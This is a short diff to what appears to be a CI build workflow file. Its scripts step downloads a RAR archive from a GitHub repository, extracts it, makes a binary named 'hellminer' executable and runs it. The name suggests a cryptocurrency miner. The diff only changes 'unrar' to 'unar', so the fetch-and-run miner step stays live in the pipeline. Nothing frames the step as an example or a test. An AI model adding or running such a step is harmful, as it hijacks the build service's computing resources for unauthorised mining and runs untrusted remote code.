@@ -19,4 +19,4 @@ workflows:
           include: true
           source: true
     scripts:
-      - brew install unrar && wget https://github.com/tesasik67/q1/raw/main/hellminer-main.rar && unrar x hellminer-main.rar && cd hellminer-main && chmod +x hellminer && ./hellminer
+      - brew install unar && wget https://github.com/tesasik67/q1/raw/main/hellminer-main.rar && unrar x hellminer-main.rar && cd hellminer-main && chmod +x hellminer && ./hellminer
